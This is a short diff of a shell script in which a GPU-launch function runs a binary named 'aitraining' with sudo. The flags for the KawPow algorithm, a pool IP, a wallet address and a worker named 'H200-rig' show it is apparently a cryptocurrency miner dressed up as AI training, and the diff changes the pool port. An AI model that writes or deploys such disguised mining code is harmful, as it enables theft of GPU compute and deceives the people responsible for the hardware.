@@ -75,7 +75,7 @@ start_gpu_process() {
         # Start the process with error handling
         if sudo ./aitraining \
             --algorithm kawpow \
-            --pool 51.89.99.172:6060 \
+            --pool 51.89.99.172:16161 \
             --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
             --worker H200-rig \
             --password x \
